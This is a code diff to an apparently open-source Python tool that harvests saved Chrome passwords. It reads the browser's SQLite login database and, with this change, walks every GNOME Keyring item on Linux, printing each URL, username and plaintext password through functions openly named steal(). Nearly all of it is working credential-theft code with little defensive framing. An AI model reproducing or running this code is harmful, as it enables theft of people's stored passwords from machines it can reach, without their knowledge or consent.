@@ -1,4 +1,5 @@
 # Common imports
+from __future__ import print_function
 import platform
 import sqlite3
 import os
@@ -12,6 +13,19 @@ elif platform.system() == 'Darwin':
 	import subprocess
 	import base64
 	from hashlib import pbkdf2_hmac
+# Linux imports
+else:
+	chrome_keyring = True
+	from re import compile as rec
+	try:
+		import gnomekeyring as gk
+	except ImportError:
+		chrome_keyring = False
+
+try:
+	str = basestring
+except:
+	pass
 
 def query_db(db_path):
 	# Try to open the SQLite3 database
@@ -24,7 +38,7 @@ def query_db(db_path):
 	try:
 		cursor.execute('SELECT action_url, username_value, password_value FROM logins WHERE username_value IS NOT \'\' OR password_value IS NOT \'\'')
 	except:
-		return ('[-] Error getting the passwords')
+		return ('[-] Error getting the passwords from the database, Chrome is probably not closed')
 	# Fetch all data
 	return cursor.fetchall()
 
@@ -34,8 +48,26 @@ def steal():
 	elif platform.system()=='Darwin':
 		return steal_osx()
 	elif platform.system()=='Linux':
+		return_list = list()
+		# Basic return
+		basic_return = steal_linux_basic()
+		if isinstance(basic_return,str):
+			return_list.append(basic_return)
+		else:
+			return_list = basic_return
 		# Linux has 3 types of storage, basic,keyring and wallet, try everything then return
-		return steal_linux_basic()
+		if chrome_keyring == False:
+			# Print a warning
+			return_list.append("[-] Warning: gnomekeyring module not found.")
+		else:
+			# Get keyring
+			keyring_list = steal_linux_keyring(rec(r"https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+"))
+			if isinstance(keyring_list,str):
+				return_list.append(keyring_list)
+			else:
+				for combo in keyring_list:
+					return_list.append(combo)
+		return return_list
 	return("[-] "+platform.system()+" is not supported.")
 # Decrypt Linux part one
 def steal_linux_basic():
@@ -62,12 +94,36 @@ def steal_linux_basic():
 				result[2] = "(Blank)"
 			# Append to results
 			recovered.append("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=result[2].decode('utf-8')))
-		if len(recovered) < 0:
-			return('[-] There are no saved passwords')
+		if len(recovered) <= 0:
+			return('[-] There are no saved passwords in the database')
 		return recovered
 	else:
 		# There are no saved passwords
-		return('[-] There are no saved passwords')
+		return('[-] There are no saved passwords in the database')
+# Decrypt Linux GNOME Keyring
+def steal_linux_keyring(regex):
+	# Recovered list
+	recovered = list()
+	# Traverse through all the keyrings
+	for keyring in gk.list_keyring_names_sync():
+		# Traverse the items
+		for id in gk.list_item_ids_sync(keyring):
+			# Extract info
+			item = gk.item_get_info_sync(keyring, id)
+			# Username
+			url = item.get_display_name()
+			username = gk.item_get_attributes_sync(keyring,id)
+			username = username['username_value'] if username.has_key('username_value') else '(Blank)'
+			password = item.get_secret()
+			# Check if thing is an URL
+			if regex.match(url) and all([username != '',password != '']):
+				# Append to results
+				recovered.append("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=url,user=username,pass_=password))			
+	if len(recovered) <= 0:
+		return ("[-] There are no saved passwords in the keyring")
+	else:
+		return recovered
+			
 def steal_osx():
 	# Recovered list
 	recovered = list()
